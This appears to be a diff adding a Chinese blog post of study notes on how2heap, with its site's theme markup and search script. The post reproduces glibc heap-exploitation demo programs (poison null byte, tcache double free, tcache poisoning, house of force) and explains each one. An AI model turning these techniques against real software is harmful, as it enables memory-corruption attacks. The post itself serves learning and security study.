+strcpy(ctr_chunk, &quot;YEAH!!!&quot;);
+fprintf(stderr, &quot;... new string: %s\n&quot;, bss_var);
+
+}
+</code></pre><h3 id="实验结果：-4"><a href="#实验结果：-4" class="headerlink" title="实验结果："></a>实验结果：</h3><p> <img src="/picture/how2heap/12.PNG" alt></p>
+<h3 id="实验分析：-4"><a href="#实验分析：-4" class="headerlink" title="实验分析："></a>实验分析：</h3><p>house_of_force 是一种通过改写 top chunk 的 size 字段来欺骗 malloc 返回任意地址的技术。我们知道在空闲内存的最高处，必然存在一块空闲的 chunk，即 top chunk，当 bins 和 fast bins 都不能满足分配需要的时候，malloc 会从 top chunk 中分出一块内存给用户。所以 top chunk 的大小会随着分配和回收不停地变化。<br>首先我们malloc一个chunk（p1），然后假设我们构建的chunk有溢出漏洞，可以以此更改topchunk的size。然后我们使用<em>(intptr_t </em>)((char *)ptr_top + sizeof(long)) = -1;将size修改为一个大数。<br>现在我们可以 malloc 一个任意大小的内存而不用调用 mmap 了。接下来 malloc 一个 chunk，使得该 chunk 刚好分配到我们想要控制的那块区域为止，这样在下一次 malloc 时，就可以返回到我们想要控制的区域了。计算方法是用目标地址减去 top chunk 地址，再减去 chunk 头的大小。这样就成功把。bss_var 给分配了出来。<br>这个技术的缺点是会受到 ASLR 的影响，因为如果攻击者需要修改指定位置的内存，他首先需要知道当前 top chunk 的位置以构造合适的 malloc 大小来转移 top chunk。而 ASLR 将使堆内存地址随机，所以该技术还需同时配合使用信息泄漏以达成攻击。</p>
+<h2 id="13-poison-null-byte-c"><a href="#13-poison-null-byte-c" class="headerlink" title="13.poison_null_byte.c"></a>13.poison_null_byte.c</h2><h3 id="代码：-5"><a href="#代码：-5" class="headerlink" title="代码："></a>代码：</h3><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;malloc.h&gt;
+
+
+int main()
+{
+fprintf(stderr, &quot;Welcome to poison null byte 2.0!\n&quot;);
+fprintf(stderr, &quot;Tested in Ubuntu 14.04 64bit.\n&quot;);
+fprintf(stderr, &quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;);
+fprintf(stderr, &quot;This technique can be used when you have an off-by-one into a malloc&apos;ed region with a null byte.\n&quot;);
+
+uint8_t* a;
+uint8_t* b;
+uint8_t* c;
+uint8_t* b1;
+uint8_t* b2;
+uint8_t* d;
+void *barrier;
+
+fprintf(stderr, &quot;We allocate 0x100 bytes for &apos;a&apos;.\n&quot;);
+a = (uint8_t*) malloc(0x100);
+fprintf(stderr, &quot;a: %p\n&quot;, a);
+int real_a_size = malloc_usable_size(a);
+fprintf(stderr, &quot;Since we want to overflow &apos;a&apos;, we need to know the &apos;real&apos; size of &apos;a&apos; &quot;
+&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;, real_a_size);
+
+b = (uint8_t*) malloc(0x200);
+
+fprintf(stderr, &quot;b: %p\n&quot;, b);
+
+c = (uint8_t*) malloc(0x100);
+fprintf(stderr, &quot;c: %p\n&quot;, c);
+
+barrier = malloc(0x100);
+fprintf(stderr, &quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;
+&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;, barrier);
+
+uint64_t* b_size_ptr = (uint64_t*)(b - 8);
+
+// added fix for size==prev_size(next_chunk) check in newer versions of glibc
+// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
+// this added check requires we are allowed to have null pointers in b (not just a c string)
+//*(size_t*)(b+0x1f0) = 0x200;
+fprintf(stderr, &quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;
+&quot;the check &apos;chunksize(P) != prev_size (next_chunk(P))&apos;\n&quot;);
+// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)
+// which is the value of b.size after its first byte has been overwritten with a NULL byte
+*(size_t*)(b+0x1f0) = 0x200;
+
+// this technique works by overwriting the size metadata of a free chunk
+free(b);
+
+fprintf(stderr, &quot;b.size: %#lx\n&quot;, *b_size_ptr);
+fprintf(stderr, &quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;);
+fprintf(stderr, &quot;We overflow &apos;a&apos; with a single null byte into the metadata of &apos;b&apos;\n&quot;);
+a[real_a_size] = 0; // &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;
+fprintf(stderr, &quot;b.size: %#lx\n&quot;, *b_size_ptr);
+
+uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
+fprintf(stderr, &quot;c.prev_size is %#lx\n&quot;,*c_prev_size_ptr);
+fprintf(stderr, &quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;,
+*((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
+b1 = malloc(0x100);
+
+fprintf(stderr, &quot;b1: %p\n&quot;,b1);
+fprintf(stderr, &quot;Now we malloc &apos;b1&apos;. It will be placed where &apos;b&apos; was. &quot;
+&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;,*c_prev_size_ptr);
+fprintf(stderr, &quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;
+&quot;before c.prev_size: %lx\n&quot;,*(((uint64_t*)c)-4));
+fprintf(stderr, &quot;We malloc &apos;b2&apos;, our &apos;victim&apos; chunk.\n&quot;);
+// Typically b2 (the victim) will be a structure with valuable pointers that we want to control
+
+b2 = malloc(0x80);
+fprintf(stderr, &quot;b2: %p\n&quot;,b2);
+
+memset(b2,&apos;B&apos;,0x80);
+fprintf(stderr, &quot;Current b2 content:\n%s\n&quot;,b2);
+
+fprintf(stderr, &quot;Now we free &apos;b1&apos; and &apos;c&apos;: this will consolidate the chunks &apos;b1&apos; and &apos;c&apos; (forgetting about &apos;b2&apos;).\n&quot;);
+
+free(b1);
+free(c);
+
+fprintf(stderr, &quot;Finally, we allocate &apos;d&apos;, overlapping &apos;b2&apos;.\n&quot;);
+d = malloc(0x300);
+fprintf(stderr, &quot;d: %p\n&quot;,d);
+
+fprintf(stderr, &quot;Now &apos;d&apos; and &apos;b2&apos; overlap.\n&quot;);
+memset(d,&apos;D&apos;,0x300);
+
+fprintf(stderr, &quot;New b2 content:\n%s\n&quot;,b2);
+
+fprintf(stderr, &quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;
+&quot;for the clear explanation of this technique.\n&quot;);
+}
+</code></pre><h3 id="实验结果：-5"><a href="#实验结果：-5" class="headerlink" title="实验结果："></a>实验结果：</h3><p> <img src="/picture/how2heap/13.PNG" alt></p>
+<h3 id="实验分析：-5"><a href="#实验分析：-5" class="headerlink" title="实验分析："></a>实验分析：</h3><p>首先分别创建a,b,c三个chunk，第一个和第三个的 chunk 类型无所谓，第一个chunk存在off-by-null即可。后两个不能是 fast chunk，因为 fast chunk 在释放后不会被合并。然后malloc一个barrier作为一个障碍，防止free（c）的时候和topchunk合并。<br>然后free（b），利用a溢出off-by-null修改freed chunk b的size=0x200，通过next_chunk宏计算可得到fake chunk。这样再次malloc会进行unlink，而glibc的chunk边界都是通过边际计算的。<br>由于malloc的chunk全部是利用边界标记法确定，glibc会误认为fake chunk才是chunk c的头部，分配堆块后，发生变化的metadata实际是 fake c.prev_size，而不是 c.prev_size。所以 chunk c 依然认为 chunk b 的地方有一个大小为 0x210 的 freed chunk。但其实这片内存已经被分配给了 chunk b1。<br>两个相邻的 small chunk 被释放后会被合并在一起。首先释放 chunk b1，伪造出<em> fake chunk b</em> 是 freed chunk 的样子。然后释放 chunk c，这时glibc检查chunk c的PREV_INUSE，确定 chunk c 的前一个 chunk b1 是一个 freed chunk，将计算size=prev_size+size，并触发unlink consolidate_forward。在consolidate forward的过程中，对于unlink的各项判断都是可以bypass的。<br>从 unsorted bin 中取出来合并进入 top chunk,top chunk 上移。chunk b2 位于 chunk b1 和 chunk c 之间，被直接无视了，现在 malloc 认为这整块 区域都是未分配的，新的 top chunk 指针已经说明了一切。这样，再次malloc就可以造成d指针与b2 构成overlap。</p>
+<h2 id="14-tcache-dup-c"><a href="#14-tcache-dup-c" class="headerlink" title="14.tcache_dup.c"></a>14.tcache_dup.c</h2><h3 id="代码：-6"><a href="#代码：-6" class="headerlink" title="代码："></a>代码：</h3><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main()
+{
+fprintf(stderr, &quot;This file demonstrates a simple double-free attack with tcache.\n&quot;);
+
+fprintf(stderr, &quot;Allocating buffer.\n&quot;);
+int *a = malloc(8);
+
+fprintf(stderr, &quot;malloc(8): %p\n&quot;, a);
+fprintf(stderr, &quot;Freeing twice...\n&quot;);
+free(a);
+free(a);
+
+fprintf(stderr, &quot;Now the free list has [ %p, %p ].\n&quot;, a, a);
+fprintf(stderr, &quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;, malloc(8), malloc(8));
+
+return 0;
+}
+</code></pre><h3 id="实验结果：-6"><a href="#实验结果：-6" class="headerlink" title="实验结果："></a>实验结果：</h3><p> <img src="/picture/how2heap/14.PNG" alt></p>
+<h3 id="实验分析：-6"><a href="#实验分析：-6" class="headerlink" title="实验分析："></a>实验分析：</h3><p>这个代码用tcache为我们展示了简单的双重攻击。<br>首先使用malloc分配缓冲区，然后free(a)两次，这样我们如果连续malloc两次，就会被分配相同的缓冲区。<br>如我运行的两个malloc（8）都分配的0x557bc0723260这个地址。</p>
+<h2 id="15-tcache-poisoning-c"><a href="#15-tcache-poisoning-c" class="headerlink" title="15.tcache_poisoning.c"></a>15.tcache_poisoning.c</h2><h3 id="代码：-7"><a href="#代码：-7" class="headerlink" title="代码："></a>代码：</h3><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+
+int main()
+{
+fprintf(stderr, &quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;
+&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;
+&quot;The attack is very similar to fastbin corruption attack.\n\n&quot;);
+
+size_t stack_var;
+fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, (char *)&amp;stack_var);
+
+fprintf(stderr, &quot;Allocating 1 buffer.\n&quot;);
+intptr_t *a = malloc(128);
+fprintf(stderr, &quot;malloc(128): %p\n&quot;, a);
+fprintf(stderr, &quot;Freeing the buffer...\n&quot;);
+free(a);
+
+fprintf(stderr, &quot;Now the tcache list has [ %p ].\n&quot;, a);
+fprintf(stderr, &quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;
+&quot;to point to the location to control (%p).\n&quot;, sizeof(intptr_t), a, &amp;stack_var);
+a[0] = (intptr_t)&amp;stack_var;
+
+fprintf(stderr, &quot;1st malloc(128): %p\n&quot;, malloc(128));
+fprintf(stderr, &quot;Now the tcache list has [ %p ].\n&quot;, &amp;stack_var);
+
+intptr_t *b = malloc(128);
+fprintf(stderr, &quot;2nd malloc(128): %p\n&quot;, b);
+fprintf(stderr, &quot;We got the control\n&quot;);
+
+return 0;
+}
+</code></pre><h3 id="实验结果：-7"><a href="#实验结果：-7" class="headerlink" title="实验结果："></a>实验结果：</h3><p> <img src="/picture/how2heap/15.PNG" alt></p>
+<h3 id="实验分析：-7"><a href="#实验分析：-7" class="headerlink" title="实验分析："></a>实验分析：</h3><p>这个文件演示了一个简单的tcache中毒攻击，它欺骗malloc返回指向任意位置的指针(在本例中是堆栈)。这种攻击非常类似于fastbin腐败攻击。<br>首先想要完成这个实验返回那个定义好的stack_var的地址，要先malloc一个a，然后我们free(a)。这样在tcache的列表中就会有a的地址。然后我们使用a[0] = (intptr_t)&stack_var;重写data的前8bytes，让他指向stack_var的地址。<br>然后malloc（128），这样tache list 就变成了stack_var的地址。</p>
+
+      
+    </div>
+    
+    
+    
+    
+    <div>
+     
+       <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------ 本文结束------</div>
+    
+</div>
+     
+     </div>
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Leng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2019/05/14/posthow2heap2/" title="how2heap学习笔记（二）">http://yoursite.com/2019/05/14/posthow2heap2/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://lengsen.github.io/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+  
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/堆溢出/" rel="tag"><i class="fa fa-tag"></i>堆溢出</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/10/简单的sql注入/" rel="next" title="简单的sql注入">
+                <i class="fa fa-chevron-left"></i> 简单的sql注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Leng</p>
+              <p class="site-description motion-element" itemprop="description">分享一些我做的项目以及实验</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#how2heap的学习"><span class="nav-number">1.</span> <span class="nav-text">how2heap的学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#这是接着之前的进行学习的"><span class="nav-number">1.1.</span> <span class="nav-text">这是接着之前的进行学习的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-fastbin-dup-c"><span class="nav-number">1.2.</span> <span class="nav-text">8.fastbin_dup.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码："><span class="nav-number">1.2.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验结果："><span class="nav-number">1.2.2.</span> <span class="nav-text">实验结果：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验分析："><span class="nav-number">1.2.3.</span> <span class="nav-text">实验分析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-unsorted-bin-attack-c"><span class="nav-number">1.3.</span> <span class="nav-text">9.unsorted_bin_attack.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码：-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验结果：-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">实验结果：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验分析：-1"><span class="nav-number">1.3.3.</span> <span class="nav-text">实验分析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-overlapping-chunks-c"><span class="nav-number">1.4.</span> <span class="nav-text">10.overlapping_chunks.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码：-2"><span class="nav-number">1.4.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验结果：-2"><span class="nav-number">1.4.2.</span> <span class="nav-text">实验结果：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验分析：-2"><span class="nav-number">1.4.3.</span> <span class="nav-text">实验分析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-overlapping-chunks-2-c"><span class="nav-number">1.5.</span> <span class="nav-text">11.overlapping_chunks_2.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码：-3"><span class="nav-number">1.5.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验结果：-3"><span class="nav-number">1.5.2.</span> <span class="nav-text">实验结果：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验分析：-3"><span class="nav-number">1.5.3.</span> <span class="nav-text">实验分析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-house-of-force-c"><span class="nav-number">1.6.</span> <span class="nav-text">12.house_of_force.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码：-4"><span class="nav-number">1.6.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验结果：-4"><span class="nav-number">1.6.2.</span> <span class="nav-text">实验结果：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验分析：-4"><span class="nav-number">1.6.3.</span> <span class="nav-text">实验分析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-poison-null-byte-c"><span class="nav-number">1.7.</span> <span class="nav-text">13.poison_null_byte.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码：-5"><span class="nav-number">1.7.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验结果：-5"><span class="nav-number">1.7.2.</span> <span class="nav-text">实验结果：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验分析：-5"><span class="nav-number">1.7.3.</span> <span class="nav-text">实验分析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-tcache-dup-c"><span class="nav-number">1.8.</span> <span class="nav-text">14.tcache_dup.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码：-6"><span class="nav-number">1.8.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验结果：-6"><span class="nav-number">1.8.2.</span> <span class="nav-text">实验结果：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验分析：-6"><span class="nav-number">1.8.3.</span> <span class="nav-text">实验分析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#15-tcache-poisoning-c"><span class="nav-number">1.9.</span> <span class="nav-text">15.tcache_poisoning.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码：-7"><span class="nav-number">1.9.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验结果：-7"><span class="nav-number">1.9.2.</span> <span class="nav-text">实验结果：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验分析：-7"><span class="nav-number">1.9.3.</span> <span class="nav-text">实验分析：</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Leng</span>
+<!--
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+-->
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </div></footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
